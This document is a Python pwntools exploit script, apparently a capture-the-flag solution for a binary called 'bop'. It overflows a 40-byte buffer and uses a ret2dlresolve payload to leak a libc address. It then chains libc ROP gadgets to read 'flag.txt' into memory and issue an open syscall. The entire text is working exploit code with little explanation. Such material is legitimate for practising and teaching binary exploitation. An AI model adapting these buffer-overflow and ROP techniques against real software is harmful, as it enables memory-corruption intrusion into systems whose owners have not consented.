from pwn import *

elf = context.binary = ELF("./bop",checksec=False)
p = elf.process()
libc = ELF("./libc.so.6",checksec=False)

gdb.attach(p,'''init-gef
''')

print(elf.got)

dlresolve = Ret2dlresolvePayload(elf, symbol='puts', args=[elf.got.gets])

rop = ROP(elf)
rop.raw('A' * 40)
# rop.read(0, dlresolve.data_addr)             # read to where we want to write the fake structures
rop.gets(dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)                 # call .plt and dl-resolve() with the correct, calculated reloc_offset
# dlresolve = Ret2dlresolvePayload(elf, symbol='__libc_start_main', args=[])
# rop.gets(dlresolve.data_addr)
# rop.ret2dlresolve(dlresolve)
rop.call(0x4012f9)
p.sendline(rop.chain())
p.sendline(dlresolve.payload)
p.recvuntil("Do you bop? ")
leak = u64((p.recvline()[:-1]).ljust(8,b'\x00'))
leak = leak - libc.sym.gets
libc.address = leak
print(hex(libc.address))
pop_rax_ret = leak + 0x0000000000036174 # pop rax ; ret
pop_rdi_ret = leak + 0x0000000000023b6a # pop rdi ; ret
pop_rsi_ret = leak + 0x000000000002601f # pop rsi ; ret
pop_rdx_ret = leak + 0x0000000000142c92 # pop rdx ; ret
syscall = leak + 0x000000000002284d # syscall
ret = leak + 0x0000000000022679 # ret

payload = b"a"*40 + p64(pop_rdi_ret) + p64(0x4040b0) + p64(elf.sym.gets) + p64(0x4012f9)
p.sendlineafter("Do you bop? ",payload)
p.sendline("flag.txt")
payload = b'a'*40 +p64(pop_rax_ret)+p64(0x2)+p64(pop_rdi_ret)+p64(0x4040b0)+p64(syscall)+p64(0x4012f9)
pause()
p.sendlineafter("Do you bop? ",payload)

p.interactive()
